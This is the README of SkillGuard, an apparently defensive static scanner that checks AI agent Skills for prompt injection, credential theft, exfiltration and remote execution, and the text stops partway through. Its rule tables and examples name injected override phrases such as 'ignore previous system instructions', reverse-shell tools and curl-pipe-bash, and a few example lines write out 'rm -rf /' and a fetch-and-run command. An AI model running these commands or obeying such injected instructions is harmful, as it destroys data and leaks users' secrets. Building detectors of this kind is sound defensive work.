<div align="center">

<picture>
  <source media="(prefers-color-scheme: dark)" srcset="docs/assets/brand/logo-dark.svg">
  <img src="docs/assets/brand/logo.svg" width="150" alt="SkillGuard logo">
</picture>

# SkillGuard

**AI Agent Skill 的离线准入层**

确定性规则负责高置信阻断，能力证据和审查队列负责覆盖不确定样本，策略 / 审计 / 锁负责让每个决定可复现。

在给 Agent 装 Skill 之前，先跑一遍 SkillGuard。

[![License: MIT](https://img.shields.io/badge/license-MIT-yellow?style=flat-square)](LICENSE) [![Rust stable](https://img.shields.io/badge/Rust-stable-orange?logo=rust&style=flat-square)](https://www.rust-lang.org/) [![Node 18+](https://img.shields.io/badge/Node-18%2B-339933?logo=node.js&logoColor=white&style=flat-square)](packages/npm) [![Python 3.9+](https://img.shields.io/badge/Python-3.9%2B-3776AB?logo=python&logoColor=white&style=flat-square)](packages/python) [![Tests](https://img.shields.io/badge/tests-100%20passing-17A673?style=flat-square)](#验证) [![Rules](https://img.shields.io/badge/rules-59-5B6CFF?style=flat-square)](rules/core.json) [![SARIF 2.1.0](https://img.shields.io/badge/SARIF-2.1.0-8B7CF6?style=flat-square)](#输出格式) [![CI](https://github.com/Seramys/skillguard/actions/workflows/ci.yml/badge.svg)](https://github.com/Seramys/skillguard/actions/workflows/ci.yml)

[简体中文](README.md) · [English](README_EN.md) · [日本語](README_JA.md) · [한국어](README_KO.md)

[30 秒开始](#30-秒开始) · [它扫描什么](#它扫描什么) · [内置规则](#内置规则) · [架构](#架构) · [验证](#验证)

</div>

<p align="center">
  <img src="docs/assets/screenshots/scan-exfil.png" width="920" alt="SkillGuard 扫描结果：critical 组合风险">
</p>
<p align="center"><sub>真实输出：一个读取 <code>~/.ssh/id_rsa</code> 并外传的 Skill，被组合规则判为 <b>critical</b>。</sub></p>

---

## 它解决什么问题

一个 Agent Skill 通常是一个目录：

```text
my-skill/
├── SKILL.md          # frontmatter + 给 Agent 的指令
├── scripts/          # sh / py / js / ps1 ...
├── config/           # json / yaml / env ...
└── assets/
```

安装一个 Skill，往往意味着同时把**指令、工具权限、脚本和网络访问**交给 Agent。恶意或粗心的 Skill 可以：

- 在 `SKILL.md` 里写“忽略之前的系统指令”，或者要求 Agent 不要告诉用户；
- 读取 `~/.ssh/id_rsa`、云凭证、Cookie、钱包文件；
- 通过 Discord/Telegram/Slack Webhook、裸 IP 或隧道把数据发出去；
- 用 `curl ... | bash`、`chmod +x` 后执行、PowerShell 编码命令等方式远程执行；
- 在安装脚本里加入 `preinstall` / `postinstall`，或引入未锁定版本的依赖；
- 用零宽字符、双向控制符或大段 Base64 隐藏真实意图。

SkillGuard 在**安装之前、进入 CI 之前**做一次静态安检：只读文件，不执行代码，不联网，把可疑指令、权限、密钥、外联和组合风险变成可定位、可抑制、可接入 Code Scanning 的结果。

它不是运行时沙箱，也不是杀毒软件。它是 Skill 供应链的第一道静态闸门。

### 准入三态与证据

- **Block**：高置信、离线、不执行，直接阻断；
- **Review**：证据不足但可疑，进入人工 / 策略队列；
- **Allow**：通过策略、基线、例外和审计记录放行。

每条结果不只告诉你“命中规则”，还通过能力证据图告诉你：Skill **声明了什么能力、实际读了什么、准备外联到哪里**。扫描 JSON 与 `review` / `explain` 输出都包含 `capabilities` 与 `evidence_graph`。

---

## 30 秒开始

需要 Rust stable。克隆仓库后：

```bash
cargo build --release
./target/release/skillguard scan ./tests/fixtures/exfil-skill --no-color
```

Windows PowerShell：

```powershell
cargo build --release
.\target\release\skillguard.exe scan .\tests\fixtures\exfil-skill --no-color
```

你会看到一个 `critical` 组合风险、两个 `high` 和一个 `medium`，进程以退出码 `1` 结束：

```text
[CRITICAL] SG-COMBO-001  组合风险：读取敏感信息并外联
[HIGH]     SG-NET-001    可疑外联：Webhook/隧道
[HIGH]     SG-PERM-002   敏感路径访问
[MEDIUM]   SG-PERM-001   权限过大：声明 Shell 执行能力
Result: FAIL
```

不想看完整输出，只要 CI 结果：

```bash
./target/release/skillguard scan ./skills --fail-on high
echo $?   # 0 = 通过，1 = 达到阈值，2 = 参数/配置/规则/IO 错误
```

生成 SARIF 并交给 GitHub Code Scanning：

```bash
./target/release/skillguard scan ./skills --format sarif --fail-on high > skillguard.sarif
```

---

## P0 准入闭环

> P0 的核心不是“替用户安装”，而是回答“这个 Skill 能不能进，证据是什么”。

```bash
# 生成不可变清单：内容哈希 + 来源 + 扫描结论
skillguard lock ./my-skill --output skillguard.lock

# 离线校验漂移/缺失/篡改
skillguard verify ./my-skill --lock skillguard.lock

# 策略门禁：allow/warn/block、例外负责人与到期时间
skillguard scan ./my-skill --policy .skillguard-policy.json --audit .skillguard-audit.jsonl

# 已知风险基线：只关心新增问题
skillguard scan ./my-skill --write-baseline baseline.json
skillguard scan ./my-skill --baseline baseline.json
```

**策略是最终决策，不是提示。** 提供 `--policy` 时，`scan` 的退出码只由策略决策决定：`fail_on` 覆盖 CLI 阈值，`fail_on: none` 可以关闭严重度阻断，生效中的例外会让对应发现不再影响决策。过期例外自动失效；策略文件中的未知字段、非法 `fail_on`、空 owner/reason、非法到期日期都会 **fail closed**（退出码 2），不会静默放行。

**证据链可校验。** `lock` 生成 `skillguard-lock/v2`：内容指纹排除 lock/baseline/audit/receipt 等元数据，记录规则包哈希、策略哈希、工具版本和每条发现的摘要；`lock` 自己生成的清单不会导致下一次 `verify` 误报。`--audit` 追加 `skillguard-audit/v2`，记录决策原因、规则/策略哈希、发现摘要，并用 `prev_hash` / `entry_hash` 串成哈希链；审计文件被改动后可以定位断点。`install` 使用 `skillguard-receipt/v2`，包含 `receipt_hash`；设置 `SKILLGUARD_RECEIPT_KEY` 后还会附加 HMAC-SHA256 签名。

`.skillguard-policy.json` 示例：

```json
{
  "profile": "team",
  "fail_on": "high",
  "max_medium": 10,
  "deny": ["SG-COMBO-001"],
  "allow": [
    {"rule": "SG-PERM-001", "owner": "alice", "reason": "approved", "expires": "2026-12-31"}
  ]
}
```

策略文件本身也参与 `lock` / `audit` / `install` 的哈希；修改策略会改变证据链。`install` 只接受 HTTPS GitHub 源和 40 位 commit SHA，带连接/读取超时与重定向上限，限制 ZIP 条目数、解压比、单文件/总大小，并拒绝绝对路径、`..`、驱动器号和越界路径。

---

## 安装

> **定位说明**：`install` 是 P1 实验轨道，不属于 P0 核心。P0 默认使用 `lock` / `verify` / `policy` / `scan`；`install` 保留用于受控环境，默认不宣传、不替用户改变环境。

> **版本状态**：**0.3.0 已发布到 npm / PyPI / [GitHub Release](https://github.com/Seramys/skillguard/releases/tag/v0.3.0)**，包含 P0–P3 准入层、59 条规则、审查队列、可选语义层和运行时网关。Release v0.3.0 提供 4 个平台二进制和 SHA256SUMS。

### 方式一：单文件二进制（推荐）

单文件、无运行时依赖，适合本机扫描和 CI。

**从 Release 下载**（v0.3.0）：下载对应平台的 `skillguard` / `skillguard.exe`，放到 `PATH` 或项目目录。npm/PyPI 包包含同一份单文件二进制。

**从源码构建**：

```bash
git clone https://github.com/Seramys/skillguard.git
cd skillguard
cargo build --release

# POSIX
./target/release/skillguard version
./target/release/skillguard scan ./tests/fixtures/clean-skill
```

```powershell
# Windows
.\target\release\skillguard.exe version
.\target\release\skillguard.exe scan .\tests\fixtures\clean-skill
```

`scripts/build.sh` 会把当前平台的产物复制到 `dist/<platform>-<arch>/`：

```bash
bash scripts/build.sh
# dist/win32-x64/skillguard.exe
# dist/linux-x64/skillguard
# dist/macos-arm64/skillguard
```

<p align="center">
  <img src="docs/assets/screenshots/scan-clean.png" width="880" alt="扫描干净的 Skill：PASS">
</p>
<p align="center"><sub>扫描一个干净的 Skill：0 findings，退出码 0。</sub></p>

### 方式二：Node 生态

已发布（多平台），一行命令：

```bash
npx --yes seramys-skillguard@0.3.0 scan ./skills --fail-on high
```

> 如果本机 npm 使用镜像源且尚未同步 0.3.0，可临时加 `--registry=https://registry.npmjs.org/`，或等镜像同步。

全局安装：

```bash
npm install -g seramys-skillguard
skillguard scan ./skills --fail-on high
```

**仓库内验证**（不依赖 npm 发布）：

```bash
node packages/npm/bin/skillguard.js version
node packages/npm/bin/skillguard.js scan ./tests/fixtures/clean-skill --no-color
```

<p align="center">
  <img src="docs/assets/screenshots/node-launcher.png" width="880" alt="Node 启动器运行 SkillGuard">
</p>
<p align="center"><sub>Node 启动器只是薄壳，扫描仍由同一份 Rust 单文件二进制完成。</sub></p>

npm 包把 4 个平台二进制放在 `vendor/<platform>-<arch>/`。0.3.0 已包含 `win32-x64`、`linux-x64`、`darwin-x64`、`darwin-arm64`，`packages/npm/lib/resolve.js` 会按当前平台选择。

### 方式三：Python 生态

已发布（多平台）：

```bash
pip install seramys-skillguard
skillguard scan ./skills --fail-on high
```

> 0.3.0 为 Windows、Linux、macOS 提供独立的平台 wheel（win_amd64、manylinux_2_17_x86_64、macOS x86_64/arm64），已发布到 PyPI。

**仓库内验证**：

```bash
python -m venv .venv

# Windows
.venv\Scripts\python -m pip install --upgrade pip setuptools wheel
.venv\Scripts\python -m pip install -e packages/python --no-build-isolation
.venv\Scripts\skillguard version
.venv\Scripts\skillguard scan tests\fixtures\clean-skill --no-color

# macOS / Linux
.venv/bin/python -m pip install --upgrade pip setuptools wheel
.venv/bin/python -m pip install -e packages/python --no-build-isolation
.venv/bin/skillguard version
.venv/bin/skillguard scan tests/fixtures/clean-skill --no-color
```

<p align="center">
  <img src="docs/assets/screenshots/python-launcher.png" width="880" alt="Python 启动器运行 SkillGuard">
</p>
<p align="center"><sub>Python 启动器同样复用 Rust 引擎，规则与输出格式完全一致。</sub></p>

Python wheel 会把二进制放进 `skillguard/_bin/`，用 `scripts/package-python.sh` 生成。

### 方式四：源码开发

```bash
cargo test
cargo clippy --all-targets -- -D warnings
cargo build --release
bash scripts/build-all.sh     # 交叉编译矩阵；缺少工具链的目标会跳过
```

三套入口共用同一份 `rules/core.json` 和同一个 `engine.rs`，不存在“Node 规则”和“Python 规则”分叉。

---

## 它扫描什么

| 类别 | 规则数 | 典型信号 |
|---|---:|---|
| 提示注入 | 5 | 忽略既有指令、套取系统提示词、对用户隐瞒、绕过人工确认、安全保证话术 |
| 混淆载荷 | 11 | 零宽字符、Base64、空白填充、pyc 篡改/危险字节码、容器内嵌脚本、OOXML 宏/OLE、PDF/SVG/HTML 主动内容 |
| 权限过大 | 3 | `allowed-tools` 声明 Shell、访问 SSH/云凭证/Cookie/钱包、任意域名 |
| 密钥与凭证 | 4 | 私钥块、云厂商 API Key 前缀、高熵赋值、`.env` / 凭证文件 |
| 可疑外联 | 4 | Discord/Telegram/Slack Webhook、裸 IP、隧道、`curl \| bash`、下载后执行 |
| 危险命令 | 4 | `rm -rf /`、反弹 Shell、crontab / LaunchAgent / 注册表持久化、`find -exec` |
| 供应链 | 4 | 未锁定版本、npm 生命周期脚本、下载后 `chmod +x` 执行、覆盖 registry |
| MCP 配置 | 4 | 未锁定 npx/uvx、Docker 高权限、自动批准、shell 包装远程执行 |
| 包卫生 | 3 | frontmatter 缺字段、exe/dll/so/msi、bat/cmd/ps1/vbs/hta/reg |
| 数据访问 | 2 | 读取环境变量、批量导出环境变量 |
| 组合风险 | 5 | 敏感读取+外联、提示注入+远程执行、环境变量+外联、话术+registry 劫持、容器脚本+批量执行 |
| **合计** | **59** | 规则均为 JSON 定义，可加载外部规则包 |

### 组合规则为什么重要

单条规则容易误报，也容易被拆开绕过。SkillGuard 会在同一个 Skill 内关联信号：

- `SG-COMBO-001`：读取 SSH 密钥/云凭证 + 外部网络调用 → **critical**，按数据外传处理；
- `SG-COMBO-002`：提示注入 + 反弹 Shell/下载执行 → **critical**，按远程控制处理；
- `SG-COMBO-003`：批量读取环境变量 + 外部网络调用 → **critical**，按凭证外传处理；
- `SG-COMBO-004`：安全保证话术 + registry 覆盖 → **critical**，按供应链劫持处理；
- `SG-COMBO-005`：容器内嵌脚本 + `find -exec` → **critical**，按隐藏载荷投递处理。

组合规则只在两个信号都未被抑制时触发；抑制其中任意一个，组合风险也会消失。

### 内置规则

<details>
<summary><b>展开：59 条内置规则完整列表</b></summary>

| ID | 严重度 | 类别 | 检测内容 |
|---|---|---|---|
| SG-PI-001 | high | 提示注入 | 忽略/绕过既有系统指令 |
| SG-PI-002 | high | 提示注入 | 套取系统提示词或内部指令 |
| SG-PI-003 | high | 提示注入 | 要求对用户/管理员隐瞒行为 |
| SG-PI-005 | medium | 提示注入 | 绕过人工确认自动执行 |
| SG-PI-008 | medium | 提示注入 | 安全保证话术（“标准做法/已审计/不写凭证”） |
| SG-PI-006 | high | 混淆 | 零宽字符、双向控制符、Unicode 标签 |
| SG-PI-007 | medium | 混淆 | 大段 Base64（解码含命令时升级为 critical） |
| SG-OBF-003 | high | 混淆 | 空白填充隐藏尾部载荷 |
| SG-PYC-001 | high | 混淆 | Python 字节码与源码大小/哈希不一致 |
| SG-PYC-002 | high | 混淆 | pyc code object 中的环境变量外联/动态执行特征 |
| SG-CONT-001 | high | 混淆 | docx/xlsx/zip 容器内嵌脚本或可执行文件 |
| SG-CONT-002 | high | 混淆 | Office 容器含 vbaProject.bin/ActiveX/OLE 嵌入 |
| SG-CONT-003 | critical | 混淆 | 容器内嵌 OLE/CFB 复合文档 |
| SG-CONT-004 | high | 混淆 | Office 外部关系、附加模板、DDE、instrText、altChunk |
| SG-PDF-001 | high | 混淆 | PDF JavaScript/OpenAction/Launch/嵌入文件 |
| SG-WEB-001 | high | 混淆 | SVG/HTML 脚本、事件处理器、javascript:、自动刷新 |
| SG-MCP-001 | high | MCP | 未锁定版本的 npx/bunx/uvx/pipx 启动 |
| SG-MCP-002 | high | MCP | Docker privileged/docker.sock/SYS_ADMIN |
| SG-MCP-003 | high | MCP | autoApprove/alwaysAllow/通配批准 |
| SG-MCP-005 | high | MCP | bash -c / powershell 包装 curl/wget/IEX |
| SG-PERM-001 | medium | 权限 | `allowed-tools` 声明 shell/终端/进程执行 |
| SG-PERM-002 | medium | 权限 | SSH、云凭证、Cookie、钱包等敏感路径（文档提及进入审查队列） |
| SG-PERM-003 | medium | 权限 | 允许任意域名/全网访问 |
| SG-SEC-001 | critical | 密钥 | 私钥块 |
| SG-SEC-002 | high | 密钥 | 常见云厂商/代码托管平台密钥前缀 |
| SG-SEC-003 | medium | 密钥 | 高熵密钥赋值 |
| SG-SEC-004 | high | 密钥 | `.env`、凭证 JSON、pem/p12 证书文件 |
| SG-NET-001 | high | 网络 | Discord/Telegram/Slack Webhook、临时文件、隧道 |
| SG-NET-002 | medium | 网络 | 裸 IP 外联（私有/回环地址自动忽略） |
| SG-NET-003 | high | 网络 | `curl ... \| bash` 远程脚本直接执行 |
| SG-NET-004 | critical | 网络 | 下载后交解释器、PowerShell 编码命令、base64 解码执行 |
| SG-CMD-001 | high | 命令 | `rm -rf /`、全盘 `chmod 777`、mkfs、dd、fork bomb |
| SG-CMD-002 | critical | 命令 | nc/ncat/socat、`/dev/tcp` 反弹 Shell |
| SG-CMD-003 | high | 命令 | crontab、LaunchAgent、计划任务、注册表 Run |
| SG-CMD-004 | medium | 命令 | `find -exec` 批量执行 |
| SG-DATA-001 | medium | 数据访问 | 读取环境变量 |
| SG-DATA-002 | high | 数据访问 | 批量导出环境变量 |
| SG-SC-001 | low | 供应链 | pip/npm/pnpm/yarn 安装未锁定版本 |
| SG-SC-002 | medium | 供应链 | npm preinstall/postinstall 生命周期脚本 |
| SG-SC-003 | high | 供应链 | 下载后 `chmod +x` 立即执行 |
| SG-SUPPLY-004 | high | 供应链 | npm/yarn registry 指向非官方地址 |
| SG-HYG-001 | low | 卫生 | frontmatter 缺少 name/description |
| SG-HYG-002 | high | 卫生 | 包含 exe/dll/so/msi 等二进制/安装包 |
| SG-HYG-003 | low | 卫生 | 包含 bat/cmd/ps1/vbs/hta/reg 脚本 |
| SG-INIT-001 | high | 准入 | 隐藏预检/初始化脚本（pre-flight/bootstrap/warmup） |
| SG-ACCT-001 | high | 准入 | Windows 本地账户、管理员组、远程桌面变更 |
| SG-PERSIST-001 | high | 准入 | cron、systemd、launchd、计划任务、Run 键持久化 |
| SG-EXEC-001 | high | 准入 | Base64/marshal/pickle/解密后执行 |
| SG-EXEC-002 | medium | 准入 | exec/eval/subprocess/child_process 动态执行入口 |
| SG-CRED-001 | critical | 准入 | 凭证/敏感数据读取 + 外传端点链路 |
| SG-CRED-002 | high | 准入 | 代码读取 SSH/云凭证/浏览器会话/钱包 |
| SG-DL-001 | high | 准入 | 下载脚本/二进制后直接执行 |
| SG-CONCEAL-001 | high | 准入 | 要求不告知用户、不写日志、静默执行 |
| SG-SEM-001 | high | 可选语义 | 本地小模型/嵌入分类器判定的可疑意图（默认关闭） |
| SG-COMBO-001 | critical | 组合 | 敏感信息访问 + 外部网络调用（数据外传） |
| SG-COMBO-002 | critical | 组合 | 提示注入 + 反弹 Shell/下载执行（远程控制） |
| SG-COMBO-003 | critical | 组合 | 批量环境变量读取 + 外部网络调用（凭证外传） |
| SG-COMBO-004 | critical | 组合 | 安全话术 + registry 覆盖（供应链劫持） |
| SG-COMBO-005 | critical | 组合 | 容器内嵌脚本 + `find -exec`（隐藏载荷投递） |

</details>

查看当前规则：

```bash
skillguard rules list
```

---

## 命令参考

```text
skillguard scan <path> [options]
skillguard review <path> [options]
skillguard explain <path> [options]
skillguard semantic check <path> [options]
skillguard semantic embed <text> [options]
skillguard admit [--policy file] [--audit file]
skillguard gateway [--bind 127.0.0.1:8787] [--once]
skillguard audit verify <audit.jsonl>
skillguard audit export <audit.jsonl> [--format json|csv]
skillguard lock <path> [--output skillguard.lock]
skillguard verify <path> [--lock skillguard.lock]
skillguard policy validate <file.json>
skillguard policy merge <base.json> <overlay.json> [--output file]
skillguard install <source> [options]   # P1 实验入口
skillguard rules list
skillguard rules validate <file.json|dir>
skillguard init [dir] [--force]
skillguard version
```

### scan 选项

| 选项 | 说明 | 默认 |
|---|---|---|
| `--format text\|json\|sarif\|github\|review\|explain` | 输出格式；`github` 输出 PR 注解，`review`/`explain` 输出能力证据 | `text` |
| `--fail-on none\|low\|medium\|high\|critical` | 达到该级别时退出码为 1；提供策略时由策略 `fail_on` 覆盖 | `high` |
| `--min-severity low\|medium\|high\|critical` | 隐藏更低级别的结果 | `low` |
| `--policy <file>` | 策略门禁，可重复叠加（policy pack）；存在时退出码由策略决策决定 | `.skillguard-policy.json`（若存在） |
| `--baseline <file>` | 隐藏基线中的已知发现 | 空 |
| `--write-baseline <file>` | 将当前发现写入基线 | 空 |
| `--audit <file>` | 追加哈希链审计记录 | 空 |
| `--ignore SG-XX-001[,SG-YY-*]` | 忽略规则，支持前缀通配 | 空 |
| `--allow-domain <domain>` | 允许某个域名的网络告警，可重复/逗号分隔 | 空 |
| `--rules <dir>` | 加载额外 JSON 规则包，同 ID 覆盖内置 | 空 |
| `--config <file>` | 指定配置文件 | `.skillguard.json` |
| `--max-file-size <kb>` | 超过该大小的文本文件跳过内容扫描 | `512` |
| `--no-color` | 关闭 ANSI 颜色 | 自动 |
| `--quiet` | 隐藏头部和汇总 | 关闭 |
| `--json-pretty` | JSON 美化输出 | 关闭 |
| `--semantic` | 启用可选的本地/远程模型层（默认关闭，不捆绑模型） | 关闭 |
| `--semantic-endpoint <url>` | OpenAI 兼容 chat completions 基址 | Ollama `http://127.0.0.1:11434/v1` |
| `--semantic-model <name>` | chat 模型 | `qwen2.5:3b-instruct-q4_K_M` |
| `--embedding-endpoint <url>` | OpenAI 兼容 embeddings 基址 | 关闭 |
| `--embedding-model <name>` | 嵌入模型 | `bge-m3`（启用时） |
| `--api-key-env <var>` | 从环境变量读取 API Key，不写入配置 | 空 |
| `--min-risk <0-100>` | 语义风险达到该值才产生 finding | `70` |

### 退出码

| 码 | 含义 |
|---|---|
| `0` | 没有达到阈值的问题；提供策略时为 `ALLOW` |
| `1` | 存在达到阈值的问题；提供策略时为 `BLOCK` |
| `2` | 参数、配置、规则、策略或 IO 错误 |

### 常用命令

```bash
# 扫描一个 Skill
skillguard scan ./my-skill

# 扫描一个 Skill 集合
skillguard scan ./skills

# CI：SARIF + 阈值
skillguard scan ./skills --format sarif --fail-on high > skillguard.sarif

# 只保留 high 及以上
skillguard scan ./skills --min-severity high

# 允许 GitHub 域名，忽略依赖未锁定提示
skillguard scan . --allow-domain github.com --ignore SG-SC-001

# 校验自定义规则包
skillguard rules validate ./my-rules/

# 生成默认配置和 GitHub Actions 工作流
skillguard init
skillguard init ./my-skill --force

# 准入审查：Block / Review / Allow + 声明/实测能力
skillguard review ./skills
skillguard explain ./skills

# CI PR 注解
skillguard scan ./skills --format github

# 叠加策略包（例如团队基线 + 本项目例外）
skillguard scan ./skills --policy .skillguard-policy.json --policy ./policies/team.json

# 可选本地语义层（先启动 Ollama；不启用时完全离线）
skillguard scan ./skills --semantic \
  --semantic-endpoint http://127.0.0.1:11434/v1 \
  --semantic-model qwen2.5:3b-instruct-q4_K_M

# 运行时工具调用准入（JSONL stdin；返回 ALLOW/REVIEW/BLOCK）
echo '{"tool":"shell","command":"rm -rf /"}' | skillguard admit --policy examples/policy.json

# 本机 HTTP 网关（默认仅绑定回环地址）
skillguard gateway --bind 127.0.0.1:8787 --policy examples/policy.json --audit .skillguard-audit.jsonl
```

---

## 输出格式

### text

人类可读，带颜色；管道或 `--no-color` 时自动关闭。每条 finding 包含规则 ID、严重度、Skill、文件:行:列、脱敏后的片段、原因和修复建议。

### JSON

```bash
skillguard scan ./tests/fixtures/exfil-skill --format json --json-pretty
```

```json
{
  "tool": "skillguard",
  "version": "0.3.0",
  "root": "/path/to/exfil-skill",
  "summary": {
    "skills": 1,
    "files": 2,
    "critical": 1,
    "high": 2,
    "medium": 1,
    "low": 0,
    "total": 4
  },
  "findings": [
    {
      "rule_id": "SG-COMBO-001",
      "title": "组合风险：读取敏感信息并外联",
      "severity": "critical",
      "category": "exfiltration",
      "skill": "sync-helper",
      "file": "SKILL.md",
      "line": 1,
      "column": 1,
      "excerpt": "signals: SG-PERM-002, SG-NET-001",
      "message": "combined signals: SG-PERM-002, SG-NET-001",
      "remediation": "立即停止使用该 Skill，审查脚本与网络目标，轮换可能泄露的凭证。",
      "references": []
    }
  ]
}
```

实际输出字段按字母序序列化；以上为可读性排序后的示例。

JSON 还包含 `capabilities` 与 `evidence_graph`：前者列出声明能力（declared）和实测能力（observed），后者用节点/边表示 `declares`、`observes` 关系。例如：

```json
{
  "capabilities": [
    {"skill": "demo", "kind": "shell", "target": "bash", "file": "SKILL.md", "line": 1, "declared": true, "evidence": "allowed-tools: bash"},
    {"skill": "demo", "kind": "credential", "target": "sensitive account data", "file": "scripts/run.py", "line": 4, "declared": false, "evidence": "open('~/.ssh/id_rsa')"}
  ],
  "evidence_graph": {
    "nodes": [{"id": "skill:demo", "type": "skill", "label": "demo"}],
    "edges": [{"from": "skill:demo", "to": "capability:demo:shell:bash:SKILL.md", "relation": "declares"}]
  }
}
```

### GitHub PR 注解

```bash
skillguard scan ./skills --format github
```

输出 `::error file=SKILL.md,line=12,col=1::SG-CRED-001 ...`，可直接在 GitHub Actions 日志中形成 PR 注解。

### SARIF 2.1.0

```bash
skillguard scan ./skills --format sarif > skillguard.sarif
```

SARIF 包含 59 条规则的元数据、`ruleId`、`level`、`physicalLocation` 和 `partialFingerprints`，可直接上传 GitHub Code Scanning：

```yaml
- uses: github/codeql-action/upload-sarif@v3
  with:
    sarif_file: skillguard.sarif
```

本地验证：SARIF `version` 为 `2.1.0`，`driver.name` 为 `SkillGuard`，规则 40 条，扫描 exfil fixture 产生 4 条结果。

---

## 架构

<p align="center">
  <img src="docs/assets/diagrams/architecture.png" width="980" alt="SkillGuard 架构：一个 Rust 引擎，三种入口">
</p>
<p align="center"><sub>一个 Rust 引擎，三种入口：单文件二进制、Node 启动器、Python 启动器。</sub></p>

### 一次扫描的七个步骤

<p align="center">
  <img src="docs/assets/diagrams/pipeline.png" width="820" alt="SkillGuard 扫描流水线：发现、解析、分类、规则、组合、抑制、报告">
</p>

1. **发现 Skill**：递归查找包含 `SKILL.md` 的目录，也支持单文件或 Skill 集合；遵循 `exclude`。
2. **解析 frontmatter**：读取 `name`、`description`、`version`、`allowed-tools` 等字段。
3. **分类文件**：markdown / script / config / text / binary；Office/ZIP 容器先解包，pyc 先做完整性校验。
4. **运行规则**：regex、路径、熵、隐藏字符、Base64、frontmatter、空白填充、容器脚本、字节码、组合十类匹配器。
5. **组合信号**：同一 Skill 内跨文件关联，生成 `SG-COMBO-*`。
6. **应用抑制**：项目 ignore、文件头、行级注释、CLI/config，精确到规则。
7. **输出报告**：text / JSON / SARIF，按严重度、Skill、文件、行号排序。

### 源码结构

```text
src/
├── main.rs          CLI 参数、配置合并、子命令
├── engine.rs        Skill 发现、扫描、抑制、组合规则
├── codeinsight.rs   代码块提取、轻量词法/数据流、能力证据
├── semantic.rs      可选 LLM/embedding 提供者（默认关闭）
├── runtime.rs       运行时 admit / gateway / 工具调用策略
├── rules.rs         规则模型、加载、合并、编译
├── frontmatter.rs   轻量 YAML frontmatter 解析
├── report.rs        text / JSON / SARIF / GitHub / review
├── guard.rs         策略、lock/audit、审查决策
├── model.rs         Severity / Finding / Capability / Summary
└── config.rs        .skillguard.json + semantic 配置
rules/core.json      59 条内置规则
examples/            语义与策略配置示例
packages/npm         npm 启动器
packages/python      Python 启动器
scripts/             构建与打包
tests/fixtures/      多组端到端与 P0 阴性/阳性夹具
bench/               公开 smoke + 冻结 holdout 工具
```

### 为什么是 Rust，为什么是单文件

- **一个引擎**：规则、组合逻辑、抑制、报告只实现一次；Node/Python 只负责找到并 `exec` 平台二进制。
- **无运行时**：单文件二进制不要求目标机器安装 Node、Python 或 JVM；适合 CI、隔离环境和临时审查。
- **线性时间正则**：Rust `regex` 不支持回溯，避免 ReDoS；扫描不可信输入时更可控。
- **只读、离线**：默认不执行被扫描代码、不发起网络请求、不上传内容；只有显式启用 `--semantic` 时才会调用你配置的本地/远程端点。
- **可审计**：规则是 JSON，找到误报可以直接看到规则 ID、正则和修复建议。

### 安全边界

- 不执行被扫描的代码，不解析动态行为；
- 不联网，不上传被扫描内容；
- 不跟随符号链接；
- 目录深度上限 32，Skill 数上限 1000，文件数上限 5000；
- 单文件文本扫描上限默认 512 KB；Office/ZIP 容器上限 16 MB、单条目 4 MB；
- 容器只解一层，不执行宏或 OLE 对象；pyc 只比对头部元数据并扫描可打印字符串；
- 密钥在 text/JSON 输出中自动脱敏（保留首尾各 4 字符）；
- 跳过 `.git`、`node_modules`、`target`、`dist`、`.venv`、`vendor` 等目录（可通过配置覆盖）。

---

## 抑制误报

<p align="center">
  <img src="docs/assets/diagrams/suppression.png" width="980" alt="SkillGuard 四层抑制：项目、文件、行、运行级">
</p>

### 1. 项目级忽略

`.skillguardignore`：

```text
# 忽略单条规则
SG-SC-001

# 忽略一组规则
SG-NET-*

# 忽略全部
*
```

也可以用 `--ignore` 或配置里的 `ignore_rules`。

### 2. 文件级抑制

```markdown
<!-- skillguard-disable-file SG-HYG-003 -->
```

忽略整个文件：

```markdown
<!-- skillguard-disable-file -->
```

### 3. 行级抑制

```bash
# skillguard-disable-next-line SG-CMD-001
rm -rf /tmp/old-build
```

```bash
curl https://example.com/install.sh | bash  # skillguard-disable-line SG-NET-003
```

只抑制指定规则；写 `*` 可抑制该行全部规则。

### 4. 运行级忽略

```bash
skillguard scan . --ignore SG-COMBO-001
```

或在配置中：

```json
{ "ignore_rules": ["SG-NET-*"] }
```

> **建议**：组合规则通常落在 `SKILL.md` 的汇总位置；如果确实要抑制，优先用文件级或项目级，并在注释里写明原因。不要用 `*` 掩盖整类风险，除非你确认该规则在该项目中不适用。

---

## 配置

在扫描根目录放置 `.skillguard.json`，或使用 `--config`：

```json
{
  "fail_on": "high",
  "min_severity": "low",
  "ignore_rules": [],
  "allow_domains": ["github.com", "pypi.org"],
  "max_file_size_kb": 512,
  "exclude": ["node_modules", ".git", "dist", "vendor", "*.min.js"],
  "rules_dir": "./extra-rules",
  "semantic": {
    "enabled": false,
    "provider": "ollama",
    "endpoint": "http://127.0.0.1:11434/v1",
    "model": "qwen2.5:3b-instruct-q4_K_M",
    "timeout_secs": 60,
    "min_risk": 70,
    "embedding_endpoint": "http://127.0.0.1:11434/v1",
    "embedding_model": "bge-m3"
  }
}
```

| 字段 | 说明 | 默认 |
|---|---|---|
| `fail_on` | 达到该级别时退出码为 1；`none` 表示永不失败 | `high` |
| `min_severity` | 隐藏更低级别的结果 | `low` |
| `ignore_rules` | 忽略规则 ID，支持前缀通配 | `[]` |
| `allow_domains` | 允许的网络域名，抑制 `SG-NET-001` 等 | `[]` |
| `max_file_size_kb` | 文本文件内容扫描上限 | `512` |
| `semantic.enabled` | 是否启用可选语义层；默认关闭 | `false` |
| `semantic.provider` | `ollama` / `openai` / `custom` | `ollama` |
| `semantic.endpoint` | OpenAI-compatible chat completions 基址 | `http://127.0.0.1:11434/v1` |
| `semantic.model` | chat 模型名；不捆绑模型 | `qwen2.5:3b-instruct-q4_K_M` |
| `semantic.api_key_env` | 从环境变量读取 API Key，不写入配置 | 空 |
| `semantic.embedding_endpoint` | embeddings 基址；仅启用嵌入分类器时使用 | 空 |
| `semantic.embedding_model` | 嵌入模型名，如 `bge-m3` | 空 |
| `semantic.min_risk` | 语义风险达到该值才产生 finding | `70` |
| `exclude` | 排除路径，支持 `*` / `?` 通配 | `[]` |
| `rules_dir` | 额外规则包目录，同 ID 覆盖内置 | 空 |

优先级：**CLI 参数 > `.skillguard.json` > 内置默认值**。

生成默认配置和工作流：

```bash
skillguard init
skillguard init ./my-skill --force
```

实际输出：

```text
wrote ./my-skill/.skillguard.json
wrote ./my-skill/.github/workflows/skillguard.yml
done. Run: skillguard scan .
```

---

## 自定义规则

规则包是 JSON。下面这条规则禁止访问未批准的第三方域名：

```json
{
  "version": "1",
  "rules": [
    {
